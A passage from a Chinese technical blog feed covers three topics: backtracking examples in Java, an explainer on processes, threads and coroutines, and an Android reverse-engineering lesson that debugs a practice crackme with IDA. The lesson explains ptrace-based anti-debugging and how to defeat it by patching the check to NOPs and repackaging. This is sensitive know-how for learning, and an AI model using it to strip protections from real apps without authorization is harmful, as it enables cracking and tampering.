    <content type="html"><![CDATA[<p>回朔算法是一种试探算法，在回朔算法中，是一步一步向前试探，会对没每一步的结果进行预估，可防止走弯路。</p><h3 id="算法模板"><a href="#算法模板" class="headerlink" title="算法模板"></a>算法模板</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">fn</span><span class="params">(n)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 判断状态是否合法</span></span><br><span class="line">   <span class="keyword">if</span>(input is invalid)&#123;</span><br><span class="line">       <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">//    判断递归是否应该结束</span></span><br><span class="line">   <span class="keyword">if</span>(match condition)&#123;</span><br><span class="line">       <span class="keyword">return</span> some value;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">// 遍历所有可能出现的情况</span></span><br><span class="line">   <span class="keyword">for</span>(all possible <span class="keyword">case</span>)&#123;</span><br><span class="line">    <span class="comment">//    尝试下一步的可能性</span></span><br><span class="line">       solution.push(m);</span><br><span class="line">    <span class="comment">//    递归</span></span><br><span class="line">       result = fn(m);</span><br><span class="line">    <span class="comment">//    回朔到上一步</span></span><br><span class="line">       solution.pop(m);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="实例一"><a href="#实例一" class="headerlink" title="实例一"></a>实例一</h3><p>给定一个⽆重复元素的数组 candidates 和一个目标数 target ，找<br>出 candidates 中所有可以使数字和为 target 的组合</p><p>candidates 中的数字可以无限制重复被选取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; combinationSum(<span class="keyword">int</span>[] candidates, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        Arrays.sort(candidates);</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();<span class="comment">//新建堆栈用来判断</span></span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();<span class="comment">//结果集</span></span><br><span class="line">        <span class="keyword">if</span> (candidates == <span class="keyword">null</span> || candidates.length == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        combin(candidates, <span class="number">0</span>, target, list, res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//对数组元素（已排序）进行逐个判断以及加入结果集</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">combin</span><span class="params">(<span class="keyword">int</span>[] candidates, <span class="keyword">int</span> start, <span class="keyword">int</span> target,List&lt;Integer&gt; list, List&lt;List&lt;Integer&gt;&gt; res)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//刚好满足则将结果存入结果集</span></span><br><span class="line">        <span class="keyword">if</span> (target == <span class="number">0</span>) &#123;</span><br><span class="line">            res.add(<span class="keyword">new</span> ArrayList&lt;&gt;(list));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = start; i &lt; candidates.length; i ++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (candidates[i] &lt;= target) &#123; <span class="comment">//判断是否已经大于target</span></span><br><span class="line">                list.add(candidates[i]);<span class="comment">//将第一个元素存入         </span></span><br><span class="line">                combin(candidates, i, target -candidates[i] , list, res);<span class="comment">//继续判断进栈元素</span></span><br><span class="line">                list.remove(list.size() - <span class="number">1</span>);<span class="comment">//不满足则将最后一个元素移除，进栈新元素判断</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;         </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="实例二"><a href="#实例二" class="headerlink" title="实例二"></a>实例二</h3><p>如何将 n 个皇后放置在 n×n 的棋盘上，并且使皇后彼此之间不能相互攻击。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 处在对角线上也可以进行攻击</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">check</span><span class="params">(<span class="keyword">int</span> row,<span class="keyword">int</span> col,<span class="keyword">int</span>[] columns)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> r=<span class="number">0</span>;r&lt;row;r++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(columns[r]==col || row-r == Math.abs(columns[r]-col))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> count;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">totalNQueens</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    count = <span class="number">0</span>;</span><br><span class="line">    backtracking(n,<span class="number">0</span>,<span class="keyword">new</span> <span class="keyword">int</span>[n]);</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backtracking</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> row,<span class="keyword">int</span>[] columns)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(row == n)&#123;</span><br><span class="line">        count++;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> col=<span class="number">0</span>;col&lt;n;col++)&#123;</span><br><span class="line">        columns[row] = col;</span><br><span class="line">        <span class="keyword">if</span>(check(row,col,columns))&#123;</span><br><span class="line">            backtracking(n,row+<span class="number">1</span>,columns);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        columns[row]=-<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;回朔算法是一种试探算法，在回朔算法中，是一步一步向前试探，会对没每一步的结果进行预估，可防止走弯路。&lt;/p&gt;
&lt;h3 id=&quot;算法模板&quot;&gt;&lt;a href=&quot;#算法模板&quot; class=&quot;headerlink&quot; title=&quot;算法模板&quot;&gt;&lt;/a&gt;算法模板&lt;/h3&gt;&lt;figure</summary>
      
    
    
    
    
    <category term="算法" scheme="http://yejuns.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>进程、线程和协程.md</title>
    <link href="http://yejuns.github.io/2021/03/23/%E8%BF%9B%E7%A8%8B%E3%80%81%E7%BA%BF%E7%A8%8B%E5%92%8C%E5%8D%8F%E7%A8%8Bmd/"/>
    <id>http://yejuns.github.io/2021/03/23/%E8%BF%9B%E7%A8%8B%E3%80%81%E7%BA%BF%E7%A8%8B%E5%92%8C%E5%8D%8F%E7%A8%8Bmd/</id>
    <published>2021-03-23T07:56:49.000Z</published>
    <updated>2021-08-15T01:40:19.439Z</updated>
    
    <content type="html"><![CDATA[<p>计算机里有两类大的资源：CPU 资源和 IO 资源。</p><ul><li>计算型的任务 主要消耗CPU 资源，比如对字符串进行 base64 编码；</li><li>输入输出类的系统调用 主要消耗 IO 资源，部分 IO 和硬件中断相关。CPU 芯片引脚上接入了很多控制芯片，比如中断控制器芯片 <code>8259A</code>。当键盘打字，中断芯片触发 CPU 上的硬件中断，CPU 被调度来处理键盘输入。</li></ul><h3 id="进程："><a href="#进程：" class="headerlink" title="进程："></a>进程：</h3><p>一个进程好比是一个程序，它是资源分配的最小单位 。同一时刻执行的进程数不会超过核心数。但是单核CPU也可以运行多进程，只不过不是同时，而是极快地在进程间来回切换实现的多进程。举个简单的例子，就算是十年前的单核CPU的电脑，也可以聊QQ的同时看视频。</p><p>电脑中有许多进程需要处于「同时」开启的状态，而利用CPU在进程间的快速切换，可以实现「同时」运行多个程序。而进程切换则意味着需要保留进程切换前的状态，以备切换回去的时候能够继续接着工作。所以进程拥有自己的地址空间，全局变量，文件描述符，各种硬件等等资源。操作系统通过调度CPU去执行进程的记录、回复、切换等等。</p><h3 id="线程："><a href="#线程：" class="headerlink" title="线程："></a>线程：</h3><p>线程是依赖于进程的，也称为 「微进程」。它是程序执行过程中的最小单元 。假设现在 8 核 CPU 上有 4 个进程，每个进程开 10 个线程，理论上也只能同步并行跑 8 个线程，其他线程都是假性的并行运行。</p><h2 id="进程与线程的区别"><a href="#进程与线程的区别" class="headerlink" title="进程与线程的区别"></a>进程与线程的区别</h2><ol><li>进程是CPU资源分配的基本单位，线程是独立运行和独立调度的基本单位（CPU上真正运行的是线程）</li><li>进程拥有自己的资源空间，一个进程包含若干个线程，线程与CPU资源分配无关，多个线程共享同一进程内的资源。</li><li>线程的调度与切换比进程快很多</li></ol><p>举个例子：<br>电脑上跑着chrome和QQ，着就是2个不同的进程。<br>Chrome进程里有多个线程进行，比如下载文件、视频播放。每个线程占据一个核心（8核CUP中的一个）。<br>从chrome切换到QQ，意味着进程进程了切换。</p><p><code>ps -T -p &lt;pid&gt;  查看该进程下的所有线程</code></p><h3 id="协程："><a href="#协程：" class="headerlink" title="协程："></a>协程：</h3><ul><li>协程是一种用户态的轻量级线程，拥有自己的寄存器上下文和栈，协程调度切换时，将寄存器上下文和栈保存在其他地方，再切回来的时候，恢复先前的寄存器上下文和栈</li><li>协程表示一个执行单元，有自己的本地数据，与其他协程共享全局数据和其他资源</li><li>我们的代码跑在线程中的，而线程是跑在进程中的。协程没有直接和操作系统关联，但他是跑在线程中的，可以是单线程，也可以是多线程</li><li>线程进程都是同步机制，而协程则是异步（一个线程内的多个协程的运行是串行的）</li></ul><p>协程优点</p><ol><li>无需线程上下文切换的开销</li><li>无需原子操作锁定及同步的开销</li><li>方便切换控制流</li><li>高并发低成本</li></ol><p>使用协程一般是解决   I/O阻塞   </p><p>（为什么线程不能解决：   因为一个IO操作就阻塞了当前线程，导致其他代码无法执行，所以我们必须使用多线程或者多进程来并发执行代码，为多个用户服务。每个用户都会分配一个线程，如果遇到IO导致线程被挂起，其他用户的线程不受影响。多线程和多进程的模型虽然解决了并发问题，但是系统不能无上限地增加线程。由于系统切换线程的开销也很大，所以，一旦线程数量过多，CPU的时间就花在线程切换上了，真正运行代码的时间就少了，结果导致性能严重下降。）</p><p>因为当一个I/O阻塞时，它可以切换到其他没有阻塞的协程上去继续执行，这样就有了比较高的效率。协程在同一个线程上，因此可以避免竞争关系而使用锁。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><p><a href="http://fuzhii.com/2021/04/02/coroutine-switch/?hmsr=toutiao.io&amp;utm_medium=toutiao.io&amp;utm_source=toutiao.io">http://fuzhii.com/2021/04/02/coroutine-switch/?hmsr=toutiao.io&amp;utm_medium=toutiao.io&amp;utm_source=toutiao.io</a><br><a href="https://mp.weixin.qq.com/s/Tp680dfOB7Zb6xlXSay7XA">https://mp.weixin.qq.com/s/Tp680dfOB7Zb6xlXSay7XA</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;计算机里有两类大的资源：CPU 资源和 IO 资源。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;计算型的任务 主要消耗CPU 资源，比如对字符串进行 base64 编码；&lt;/li&gt;
&lt;li&gt;输入输出类的系统调用 主要消耗 IO 资源，部分 IO 和硬件中断相关。CPU 芯片引脚上接入了很多</summary>
      
    
    
    
    
    <category term="计算机基础" scheme="http://yejuns.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向第八课 - IDA动态调试</title>
    <link href="http://yejuns.github.io/2021/03/18/Android%E9%80%86%E5%90%91%E7%AC%AC%E5%85%AB%E8%AF%BE/"/>
    <id>http://yejuns.github.io/2021/03/18/Android%E9%80%86%E5%90%91%E7%AC%AC%E5%85%AB%E8%AF%BE/</id>
    <published>2021-03-18T11:01:51.000Z</published>
    <updated>2021-08-21T01:10:24.377Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ida动态调试"><a href="#ida动态调试" class="headerlink" title="ida动态调试"></a>ida动态调试</h2><p>如果要进行动态调试，首先需要搭建相关环境，我使用的还是阿里的 <code>crackMe.apk</code> 进行测试。</p><p>1、将 IDAPro\dbgsrv 目录下的<code>android_server</code> push 到手机/data/local/tmp/目录下 给777权限 并./运行,  <code>adb push android_x86_server /data/local/tmp/</code> (cpu型号要对应 模拟器是x86)</p><p>2、端口转发,命令 <code>adb forward tcp:23946 tcp:23946</code></p><p>3、本地打开IDA，选中 <code>Go</code>按钮，然后入下图操作，就可以进行动态分析<br><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-6.png"></p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-7.png"></p><p>4、 获取进程信息成功后，在主页面通过<code>ctrl + s</code> 找到要调试的so文件 选择有 X 的（可执行的），这里我们也可以使用 ctrl+F 找出目标so文件</p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-8.png"></p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-9.png"></p><p>5、 在对 <code>so</code>文件进行静态分析的时候，我们可以获取到每个函数的偏移，而在进行动态调试的时候，由于 <code>so</code>文件被加载到内存，每个函数都存在真实的地址，我们需要算出目标函数的真实地址。比如：<code>check()</code> 函数的偏移量是 <code>0x65403</code>，(可以理解为相对于so文件头的距离),我们动态打开ida，选中 so 文件的时候，会显示这个 so 文件头的绝对地址 <code>F4012C6</code>，F4012C6 + 0x65403 就是 check 函数的绝对地址。</p><p>按G键， 输入绝对地址，跳转到要调试的函数处</p><p>如何计算要调试函数的绝对地址？</p><ul><li>绝对地址 = so文件的基地址 + 该函数的偏移量</li></ul><p>so文件的基地址在哪儿找？</p><ul><li>快捷键 ctrl + s 找到目标so文件 Start 那一项就是 基地址</li></ul><p>函数的偏移量在哪儿找？</p><ul><li>以静态方式打开so文件，函数列表里</li></ul><h3 id="1-调试原理"><a href="#1-调试原理" class="headerlink" title="1. 调试原理"></a>1. 调试原理</h3><p>利用Linux系统 <code>ptrace</code> 来实现，<code>ptrace 系统调用</code>可以允许一个进程控制另外一个进程并从内部替换 Peek and poke 被控制进程的内核镜像的值（Peek and poke 指的是直接读写内存内容）</p><p>当我们使用Ptrace方式跟踪一个进程时，目标进程会记录自己被谁跟踪，可以查看/proc/pid/status看到这个信息, 当应用被调试时，<code>TracerPid</code> 字段就不为 0。</p><p><strong>反调试</strong>，既检测 <code>TracerPid</code> 是否被占用。新建一个线程不停的检测TracerPid这个字段是否不为0，不为0，就立即退出程序。</p><h3 id="2-动态调试"><a href="#2-动态调试" class="headerlink" title="2. 动态调试"></a>2. 动态调试</h3><p>如果想要绕过反调试，就需要找到检测 TracerPid 的代码，不执行此代码，此检查代码一般在<code>.init_arra</code> 和 <code>JNI_OnLoad</code> 两处, 在 JNI_OnLoad 函数出打断点调试，找到检测 TracerPid 的代码，不执行此代码。</p><p>因为so文件在加载的时候会先执行 init_array 中的函数（会在 so 文件加载的时候执行），然后再执行 JNI_OnLoad()函数</p><h3 id="3-实例"><a href="#3-实例" class="headerlink" title="3. 实例"></a>3. 实例</h3><p>我们上次通过静态分析找出了 <code>crackMe.apk</code> 中密码所在的关键位置<code>off_628C</code>，现在我们需要通过动态调试进行确认内容。</p><p>首先，使用ida静态确定 <code>Java_com_yaotong_crackme_MainActivity_securityCheck()</code> 这个方法的偏移量，<code>000011A8</code></p><p>然后，用ida动态加载app，找出crakeMe.so 文件的启始位置是 <code>F40B8000</code>，使用计算机器，可以算出 <code>securityCheck()</code> 的绝对地址是 <code>F40B91A8</code>。在ida的动态调试界面，使用快捷键 <code>G</code>,进行地址跳转，跳转后的结果也证明我们的目标没有错</p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-10.png"></p><p>右击方法名添加断点，断点设置好后，点击左上角三角形运行，等待APP运行到此断点处，就会停止，此时即可调试（有时候会不能成功运行，那就需要重新加载该 so 文件)。我们这里会直接退出，主页面上显示 <code>ffffffff</code>, 这说明该 so 文件加了反调试。</p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-11.png"></p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-12.png"></p><p>接下来的任务就是如何去绕过程序的反调试机制 ?</p><p><strong>如何找到反调试代码</strong></p><p>指令一般会整过执行完，直到函数末尾。多次IDA中，如果指令在中途某个地方退出了，说明该处就是反调试指令</p><p><strong>如何在JNI_OnLoad函数打断点</strong></p><p>so文件在加载阶段会执行JNI_ONLoad，此后不再执行，要在so文件加载阶段才给JNI_OnLoad 打断点</p><ol><li><p>修改APP AndroidMenifest.xml文件， 给APP加上可调试权限，android:debuggable=”true”，然后重新打包APP，签名，安装;<br><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-14.png"></p></li><li><p>检查flags中是否允许debug项：</p><p>adb shell dumpsys package com.yaotong.crackme<br>（会显示相关进行的信息，是否允许debug等）</p></li><li><p>以调试模式启动APP，APP此时会挂住</p><p>adb shell am start -D -n 包名/.类名</p><p>adb shell am start -D -n com.yaotong.crackme/.MainActivity</p></li><li><p>在ida的 DebuggerOptions 里勾选 <code>Suspend on thread start/exit</code> 和<code>Suspend on library load/unload</code>。 JNI_OnLoad 函数是 lib 刚加载时就会执行，必须要在lib载入时就让程序停下来，才能调试JNI_OnLoad；</p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-13.png"></p></li><li><p>在ida里点击运行按钮，然在设备里查看APP的进程ID，<code>ps | grep 应用包名</code>;</p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-15.png"></p></li><li><p>使用JDB命令让 APP 恢复运行</p><p>adb forward tcp:8700 jdwp:873（APP的PID）</p><p>jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700</p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-16.png"></p></li><li><p>在so文件被加载时，IDA会停止住，使用ctrl+s 查看目标so文件是否加载. 若加载了目标so文件，计算JNI_OnLoad的绝对地址，按G键跳转到JNI_OnLoad出设置断点，恢复APP执行。<br><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-17.png"></p></li><li><p>找到反调试代码处，pthread_create()，（关键地方，可按f5，把汇编代码转成C语言辅助）反复按 <code>F8</code> 单步执行，程序退出处，既为反调）</p></li><li><p>让反调试代码不执行。 让该指令变为空指令，既 NOP，NOP指令的16进制是 <code>00 00 00 00</code>。记住反调试处的汇编指令，同时以静态方式再打开一个IDA，打开so文件，在静态ida里查找到此汇编指令，鼠标选中后面的寄存器，然后切换到 <code>Hex View</code>，会显示该<br>指令的16进制。复制该16进制，再用一文本工具打开目标so文件，找到该16进制处，替换成 <code>00 00 00 00</code> ，既空指令。既不执行反调试代码.</p></li><li><p>保存so文件，再重新打包APP，签名，重新安装APP。</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ida动态调试&quot;&gt;&lt;a href=&quot;#ida动态调试&quot; class=&quot;headerlink&quot; title=&quot;ida动态调试&quot;&gt;&lt;/a&gt;ida动态调试&lt;/h2&gt;&lt;p&gt;如果要进行动态调试，首先需要搭建相关环境，我使用的还是阿里的 &lt;code&gt;crackMe.apk&lt;/</summary>
      
    
    
    
    
    <category term="Android逆向" scheme="http://yejuns.github.io/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
</feed>
